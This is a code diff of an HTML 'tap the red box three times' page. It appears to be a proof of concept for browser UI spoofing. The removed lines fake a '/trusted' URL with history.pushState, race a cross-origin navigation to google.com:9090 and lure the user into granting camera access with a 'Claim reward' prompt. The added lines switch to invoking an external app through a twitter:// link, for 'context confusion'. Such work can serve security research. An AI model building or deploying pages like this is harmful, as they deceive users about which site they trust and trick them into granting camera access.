@@ -31,15 +31,6 @@
     font-size:26px;
     text-align:center;
   }
-
-  video {
-    position:absolute;
-    bottom:20px;
-    left:50%;
-    transform:translateX(-50%);
-    width:240px;
-    border-radius:10px;
-  }
 </style>
 </head>
 
@@ -47,54 +38,40 @@
 
 <div id="redBox"></div>
 <div id="counter">Tap the red box 3×</div>
-<video id="cam" autoplay playsinline></video>
 
 <script>
 let clicks = 0;
-
 const box = document.getElementById("redBox");
 const counter = document.getElementById("counter");
-const cam = document.getElementById("cam");
 
-box.onclick = async () => {
+box.onclick = () => {
   clicks++;
   counter.textContent = "x" + clicks;
 
-  // 1️⃣ Fake trust / visual state
+  // 1️⃣ Visual trust manipulation
   if (clicks === 1) {
     history.pushState({}, "", "/trusted");
     counter.textContent = "Nice! Keep tapping…";
   }
 
-  // 2️⃣ Navigation race (origin desync)
+  // 2️⃣ External App Invocation (iOS style)
   if (clicks === 2) {
-    counter.textContent = "Almost there…";
+    counter.textContent = "Opening reward app…";
 
-    requestAnimationFrame(() => {
-      requestAnimationFrame(() => {
-        setTimeout(() => {
-          // 🔥 Cross-origin navigation
-          location.href = "https://google.com:9090";
-        }, 70);
-      });
-    });
+    setTimeout(() => {
+      // 🔥 CALL APP (if installed)
+      location.href = "twitter://user?screen_name=apple";
+
+      // fallback (optional)
+      setTimeout(() => {
+        location.href = "https://apps.apple.com/";
+      }, 800);
+    }, 80);
   }
 
-  // 3️⃣ Sensitive API — CAMERA
+  // 3️⃣ Context confusion after return
   if (clicks === 3) {
-    counter.textContent = "Claim reward 🎁";
-
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
-        cam.srcObject = stream;
-        counter.textContent = "Camera access granted";
-      } catch (e) {
-        counter.textContent = "Camera permission denied";
-      }
-    } else {
-      counter.textContent = "Camera API not supported";
-    }
+    counter.textContent = "Back from app 🎁";
   }
 };
 </script>
